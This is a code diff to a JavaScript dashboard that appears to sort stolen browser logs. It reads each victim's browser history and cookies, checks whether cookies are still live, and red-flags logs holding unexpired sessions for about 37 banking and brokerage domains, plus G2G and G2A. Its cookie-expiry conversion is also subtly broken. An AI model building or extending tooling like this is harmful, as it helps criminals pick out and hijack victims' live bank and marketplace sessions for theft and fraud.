@@ -30,6 +30,40 @@ const headCells = [
     { id: 'actions', numeric: false, disablePadding: false, label: 'Actions' },
 ];
 
+// Function to check if a cookie is non-expired
+const isCookieNonExpired = (cookie) => {
+    if (!cookie || cookie.expires === undefined || cookie.expires === null) {
+        // Session cookie or no expiration - consider it non-expired
+        return true;
+    }
+    
+    // expires_utc is in microseconds since Windows epoch (1601-01-01)
+    // Windows epoch to Unix epoch difference: 11644473600000 milliseconds
+    const WINDOWS_EPOCH_DIFF_MS = 11644473600000;
+    
+    // If expires is 0, it's a session cookie (never expires)
+    if (cookie.expires === 0) {
+        return true;
+    }
+    
+    try {
+        // Convert microseconds to milliseconds, then subtract epoch difference
+        const expiresMs = (cookie.expires / 1000000) - WINDOWS_EPOCH_DIFF_MS;
+        const expiresDate = new Date(expiresMs);
+        
+        // Validate the date is reasonable
+        if (isNaN(expiresDate.getTime())) {
+            return true; // If we can't parse it, assume it's valid
+        }
+        
+        // Check if expiration is in the future
+        return expiresDate > new Date();
+    } catch (e) {
+        // If parsing fails, assume it's valid
+        return true;
+    }
+};
+
 // Function to extract tags from log data
 const extractTags = (log) => {
     const tags = [];
@@ -42,6 +76,8 @@ const extractTags = (log) => {
     
     // Check browser history and cookies for sites
     const allUrls = [];
+    const historyUrls = [];
+    const cookieData = [];
     
     // Extract URLs from browser history
     if (pcData.browserHistory) {
@@ -49,13 +85,17 @@ const extractTags = (log) => {
         ['chromeHistory', 'firefoxHistory', 'edgeHistory', 'operaHistory', 'braveHistory'].forEach(browser => {
             if (history[browser] && Array.isArray(history[browser])) {
                 history[browser].forEach(entry => {
-                    if (entry.url) allUrls.push(entry.url.toLowerCase());
+                    if (entry.url) {
+                        const url = entry.url.toLowerCase();
+                        allUrls.push(url);
+                        historyUrls.push(url);
+                    }
                 });
             }
         });
     }
     
-    // Extract domains from cookies
+    // Extract domains from cookies with expiration info
     if (pcData.browserCookies) {
         let cookies = [];
         if (typeof pcData.browserCookies === 'string') {
@@ -67,7 +107,11 @@ const extractTags = (log) => {
                 if (domainMatches) {
                     domainMatches.forEach(match => {
                         const domain = match.match(/"([^"]+)"/)[1];
-                        if (domain) allUrls.push(domain.toLowerCase());
+                        if (domain) {
+                            const url = domain.toLowerCase();
+                            allUrls.push(url);
+                            cookieData.push({ domain: url, expires: null }); // Can't parse expiration from string
+                        }
                     });
                 }
             }
@@ -77,12 +121,35 @@ const extractTags = (log) => {
         
         if (Array.isArray(cookies)) {
             cookies.forEach(cookie => {
-                if (cookie.domain) allUrls.push(cookie.domain.toLowerCase());
+                if (cookie.domain || cookie.host) {
+                    const domain = (cookie.domain || cookie.host).toLowerCase();
+                    allUrls.push(domain);
+                    cookieData.push({
+                        domain: domain,
+                        expires: cookie.expires || cookie.expires_utc || null
+                    });
+                }
             });
         }
     }
     
-    // Site detection patterns
+    // Site detection patterns - sites that require non-expired cookies
+    const cookieRequiredSites = {
+        'G2G': ['g2g.com'],
+        'G2A': ['g2a.com'],
+        'Banking': [
+            'chase.com', 'bankofamerica.com', 'wellsfargo.com', 'citibank.com', 'usbank.com',
+            'pnc.com', 'tdbank.com', 'capitalone.com', 'americanexpress.com', 'discover.com',
+            'barclays.com', 'hsbc.com', 'jpmorgan.com', 'morganstanley.com', 'goldmansachs.com',
+            'schwab.com', 'fidelity.com', 'vanguard.com', 'etrade.com', 'ally.com',
+            'synchrony.com', 'regions.com', 'suntrust.com', 'bbt.com', 'keybank.com',
+            'huntington.com', 'fifththird.com', 'm&t.com', 'citizensbank.com', 'td.com',
+            'banking.wellsfargo.com', 'onlinebanking.usbank.com', 'secure.bankofamerica.com',
+            'secure.chase.com', 'online.citi.com', 'online.pnc.com', 'secure.tdbank.com'
+        ]
+    };
+    
+    // Site detection patterns - sites that don't require cookie expiration check
     const sitePatterns = {
         'YouTube': ['youtube.com', 'youtu.be', 'youtube-nocookie.com'],
         'Microsoft': ['microsoft.com', 'office.com', 'outlook.com', 'live.com', 'hotmail.com', 'onedrive.com', 'azure.com', 'microsoftonline.com'],
@@ -102,7 +169,26 @@ const extractTags = (log) => {
         'Discord': ['discord.com', 'discordapp.com', 'discord.gg'],
     };
     
-    // Check for each site
+    // Check cookie-required sites (only show if non-expired cookies exist)
+    Object.keys(cookieRequiredSites).forEach(siteName => {
+        const patterns = cookieRequiredSites[siteName];
+        const foundInHistory = historyUrls.some(url => {
+            return patterns.some(pattern => url.includes(pattern));
+        });
+        
+        // Check if there are non-expired cookies for this site
+        const hasNonExpiredCookie = cookieData.some(cookie => {
+            const matchesDomain = patterns.some(pattern => cookie.domain.includes(pattern));
+            return matchesDomain && isCookieNonExpired(cookie);
+        });
+        
+        // Show tag if found in history OR if there's a non-expired cookie
+        if ((foundInHistory || hasNonExpiredCookie) && !tags.some(t => t.label.includes(siteName))) {
+            tags.push({ label: siteName, color: siteName === 'Banking' ? '#ef4444' : '#60a5fa' });
+        }
+    });
+    
+    // Check for regular sites (from history or cookies, no expiration requirement)
     Object.keys(sitePatterns).forEach(siteName => {
         const patterns = sitePatterns[siteName];
         const found = allUrls.some(url => {
